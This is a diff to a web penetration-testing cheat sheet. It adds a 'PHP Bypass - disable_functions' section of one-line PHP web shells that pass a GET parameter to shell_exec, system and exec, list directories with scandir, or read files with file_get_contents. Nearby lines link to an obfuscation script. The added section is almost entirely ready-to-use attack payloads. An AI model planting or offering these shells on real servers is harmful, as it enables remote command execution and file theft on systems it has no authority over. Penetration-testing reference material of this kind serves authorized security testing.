@@ -72,7 +72,20 @@ https://www.silisoftware.com/tools/ipconverter.php
 //GET  
 https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/
 
-### PHP Bypass Function
+### PHP Bypass - disable_functions
+
+#### Functions
+-> shell_exec  
+<?php echo shell_exec($_GET['ok']);?>  
+-> system  
+<?php system($_GET['ok']);?>  
+-> exec  
+<?php echo exec($_GET['ok']);?>  
+-> scandir  
+<?php foreach(scandir($_GET['ok']) as $dir){echo "<br>";echo $dir;};?>
+-> file_get_contents  
+<?php file_get_contents($_GET['ok']);?>
+
 ### PHP Obfuscation - base64+gzdeflate
 
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/obfuscation/obfuscation.php
